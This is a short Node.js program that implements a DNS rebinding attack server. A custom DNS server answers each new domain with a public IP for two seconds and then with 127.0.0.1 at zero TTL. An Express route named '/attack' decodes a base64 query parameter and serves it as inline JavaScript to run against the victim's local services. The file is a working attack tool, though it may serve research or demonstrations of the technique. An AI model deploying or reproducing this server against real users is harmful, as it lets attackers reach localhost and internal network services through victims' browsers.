const http = require('http')
const httpPort = 5000

const express = require('express')
const app = express()

const dns = require('node-named')
const dnsPort = 53

const dnsServer = dns.createServer()

dnsServer.listen(dnsPort, '::ffff:0.0.0.0', ()=> {
  console.log(`DNS server is listening on ${dnsPort}`)
})

let cache = {}

dnsServer.on('query', query => {
  var domain = query.name()
  var type = query.type()

  if(!cache[domain]){
    cache[domain] = {
      timeStamp: Date.now()
    }
  }

  switch(type){
    case 'A':
      if(cache[domain].timeStamp > Date.now() - 2000){
        let record = new dns.ARecord('81.4.124.10')
        query.addAnswer(domain, record, 0)
      }else{
        let record = new dns.ARecord('127.0.0.1')
        query.addAnswer(domain, record, 0)
      }
      break;
      default:
        return
      break;
  }

  console.log('DNS Query: (%s) %s', type, domain)
  dnsServer.send(query)
})

app.get('/', (req, res) => {
  res.sendFile('public/index.html' , { root : __dirname})
})

app.get('/attack', (req, res) => {
  const script = new Buffer(req.query.script, 'base64').toString('ascii')
  res.end(`
    <html>
      <script>
        ${script} 
      </script>
    </html>
  `)
})

app.listen(httpPort, () => {
  console.log(`HTTP server is listening on ${httpPort}`)
})
